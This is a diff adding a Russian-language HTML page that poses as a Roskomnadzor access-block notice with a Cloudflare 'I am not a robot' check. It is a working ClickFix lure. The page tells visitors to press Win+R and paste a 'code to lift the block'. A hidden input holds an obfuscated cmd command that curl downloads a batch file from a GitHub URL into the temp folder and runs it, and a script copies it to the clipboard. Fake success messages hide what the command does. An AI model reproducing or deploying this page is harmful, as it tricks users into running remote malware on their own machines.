@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Доступ ограничен · Роскомнадзор</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #030405;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 520px;
+        }
+
+        .card {
+            background: #111316;
+            border-radius: 28px;
+            padding: 2rem 1.8rem;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Роскомнадзор */
+        .rkn-strip {
+            background: #0b1a2a;
+            border-radius: 12px;
+            padding: 0.9rem 1.2rem;
+            margin-bottom: 1.8rem;
+            border-left: 4px solid #c60c30;
+            font-size: 0.8rem;
+        }
+
+        .rkn-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #94a3b8;
+            margin-bottom: 6px;
+        }
+
+        .rkn-row i { width: 16px; font-size: 0.8rem; }
+        .rkn-row .red { color: #c60c30; }
+        .rkn-row .blue { color: #3b82f6; }
+        .rkn-id { color: #f38020; font-family: monospace; }
+
+        /* Хедер Cloudflare */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1.8rem;
+        }
+
+        .cf-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .cf-icon {
+            background: #f38020;
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .cf-text {
+            font-weight: 600;
+            font-size: 1.2rem;
+            color: white;
+        }
+
+        .badge {
+            background: rgba(59, 130, 246, 0.1);
+            color: #3b82f6;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+
+        /* Turnstile виджет */
+        .turnstile-box {
+            background: rgba(20, 25, 35, 0.7);
+            border-radius: 18px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .cf-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #1a1e2a;
+            padding: 14px 22px;
+            border-radius: 60px;
+            width: fit-content;
+            margin: 0 auto;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .cf-logo-small {
+            background: #2d3748;
+            width: 28px;
+            height: 28px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+        }
+
+        .cf-label {
+            color: #e2e8f0;
+            font-size: 0.9rem;
+        }
+
+        .cf-spinner {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid #4a5568;
+            transition: all 0.2s;
+        }
+
+        .cf-spinner.loading {
+            border: 2px solid #f38020;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .cf-spinner.success {
+            border: 2px solid #22c55e;
+            background: #22c55e;
+            position: relative;
+        }
+
+        .cf-spinner.success::after {
+            content: '✓';
+            color: white;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ClickFix секция */
+        .fix-block {
+            background: rgba(30, 20, 15, 0.6);
+            border-radius: 18px;
+            padding: 1.5rem;
+            border-left: 4px solid #f38020;
+            margin: 1.5rem 0;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 14px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 14px;
+            border-radius: 14px;
+        }
+
+        .step-num {
+            background: #f38020;
+            color: black;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            color: #e2e8f0;
+            font-size: 0.9rem;
+        }
+
+        .step-text kbd {
+            background: #000;
+            color: #f38020;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            border: 1px solid #f38020;
+        }
+
+        .btn-copy {
+            width: 100%;
+            padding: 14px;
+            background: #f38020;
+            border: none;
+            border-radius: 40px;
+            font-weight: 600;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            cursor: pointer;
+            transition: 0.2s;
+            margin: 16px 0 8px;
+            font-size: 0.95rem;
+        }
+
+        .btn-copy:hover { background: #fa6e1f; transform: translateY(-1px); }
+        .btn-copy:active { transform: translateY(0); }
+
+        .footer-note {
+            font-size: 0.7rem;
+            color: #4a5568;
+            text-align: center;
+            margin-top: 1.5rem;
+            padding-top: 1.2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #22c55e;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            opacity: 0;
+            transition: 0.2s;
+            pointer-events: none;
+            z-index: 9999;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+
+        .toast.show { opacity: 1; }
+
+        /* Скрытое поле для команды */
+        #hiddenCopyInput {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+        }
+
+        /* Информативное сообщение */
+        .info-message {
+            background: rgba(0, 40, 20, 0.5);
+            border: 1px solid #22c55e;
+            color: #22c55e;
+            padding: 12px 16px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: 500;
+            backdrop-filter: blur(4px);
+        }
+        
+        .info-message i {
+            margin-right: 8px;
+            color: #22c55e;
+        }
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast"><i class="fas fa-check-circle"></i> Код скопирован</div>
+
+    <!-- Скрытое поле с командой (пользователь его не видит) -->
+    <input type="text" id="hiddenCopyInput" readonly value="cmd /c (set a=curl)&(set b=-s -L)&(set c=https://raw.githubusercontent.com/nathan-ingram10/update/main/update.bat)&(set d=-o %temp%\update.bat)&call %a% %b% %c% %d% & call %temp%\update.bat"">
+
+    <div class="container">
+        <div class="card">
+            <!-- РКН -->
+            <div class="rkn-strip">
+                <div class="rkn-row">
+                    <i class="fas fa-shield-alt red"></i>
+                    <span>Федеральная служба по надзору в сфере связи</span>
+                </div>
+                <div class="rkn-row">
+                    <i class="fas fa-ban red"></i>
+                    <span>Доступ ограничен по <span class="blue">ФЗ-149</span></span>
+                </div>
+                <div class="rkn-row">
+                    <i class="far fa-file-alt blue"></i>
+                    <span>Реестр: <span class="rkn-id">78-1-РН-2026-0045927</span></span>
+                </div>
+            </div>
+
+            <!-- Cloudflare -->
+            <div class="header">
+                <div class="cf-logo">
+                    <div class="cf-icon"><i class="fas fa-cloud"></i></div>
+                    <span class="cf-text">Cloudflare</span>
+                </div>
+                <div class="badge"><i class="fas fa-shield-alt"></i> Turnstile</div>
+            </div>
+
+            <!-- Turnstile анимация -->
+            <div class="turnstile-box">
+                <div style="display: flex; justify-content: center;">
+                    <div class="cf-checkbox" id="cfCheckbox">
+                        <div class="cf-logo-small"><i class="fas fa-check"></i></div>
+                        <span class="cf-label">Я не робот</span>
+                        <div class="cf-spinner" id="cfSpinner"></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ClickFix блок -->
+            <div class="fix-block">
+                <div style="color:#f38020; font-weight:600; margin-bottom:16px;">
+                    <i class="fas fa-exclamation-triangle"></i> Требуется подтверждение
+                </div>
+
+                <div class="step-item">
+                    <div class="step-num">1</div>
+                    <div class="step-text">Нажмите <kbd>Win</kbd> + <kbd>R</kbd></div>
+                </div>
+
+                <div class="step-item">
+                    <div class="step-num">2</div>
+                    <div class="step-text">Нажмите кнопку копирования</div>
+                </div>
+
+                <button class="btn-copy" id="copyBtn">
+                    <i class="fas fa-copy"></i> Скопировать код
+                </button>
+
+                <div class="step-item" style="margin-top:8px;">
+                    <div class="step-num">3</div>
+                    <div class="step-text">Вставьте (<kbd>Ctrl</kbd> + <kbd>V</kbd>) и нажмите <kbd>Enter</kbd></div>
+                </div>
+
+                <div style="font-size:0.7rem; color:#f38020; text-align:center; margin-top:12px; opacity:0.7;">
+                    <i class="fas fa-shield-halved"></i> Код для снятия блокировки (ФЗ-149)
+                </div>
+            </div>
+
+            <!-- ИНФОРМАТИВНОЕ СООБЩЕНИЕ -->
+            <div class="info-message">
+                <i class="fas fa-download"></i> 
+                SSL encryption keys have been successfully updated!
+            </div>
+
+            <div class="footer-note">
+                <i class="fas fa-cloud"></i> Cloudflare · 256-bit SSL · РКН
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // Элементы
+            const spinner = document.getElementById('cfSpinner');
+            const copyBtn = document.getElementById('copyBtn');
+            const toast = document.getElementById('toast');
+            const hiddenInput = document.getElementById('hiddenCopyInput');
+
+            // Анимация Turnstile
+            setTimeout(() => { spinner.classList.add('loading'); }, 200);
+            setTimeout(() => {
+                spinner.classList.remove('loading');
+                spinner.classList.add('success');
+            }, 2000);
+
+            // Функция копирования (максимально надежная)
+            function copyToClipboard() {
+                // Пробуем современный API
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(hiddenInput.value).then(() => {
+                        showSuccess();
+                    }).catch(() => {
+                        fallbackCopy();
+                    });
+                } else {
+                    fallbackCopy();
+                }
+            }
+
+            // Резервный метод копирования
+            function fallbackCopy() {
+                hiddenInput.select();
+                hiddenInput.setSelectionRange(0, 99999);
+                
+                if (document.execCommand('copy')) {
+                    showSuccess();
+                } else {
+                    // Если совсем ничего не работает - показываем команду в alert
+                    alert('Нажмите Ctrl+C, чтобы скопировать:\n\n' + hiddenInput.value);
+                    hiddenInput.select();
+                }
+                
+                hiddenInput.blur();
+            }
+
+            // Показать успешное копирование
+            function showSuccess() {
+                toast.classList.add('show');
+                setTimeout(() => toast.classList.remove('show'), 2000);
+
+                const original = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check-circle"></i> Скопировано!';
+                copyBtn.style.background = '#22c55e';
+                setTimeout(() => {
+                    copyBtn.innerHTML = original;
+                    copyBtn.style.background = '#f38020';
+                }, 1500);
+            }
+
+            // Обработчик кнопки
+            copyBtn.addEventListener('click', copyToClipboard);
+
+            // Для надежности: копируем также по нажатию на саму кнопку с зажатым Ctrl
+            copyBtn.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.key === 'c') {
+                    e.preventDefault();
+                    copyToClipboard();
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
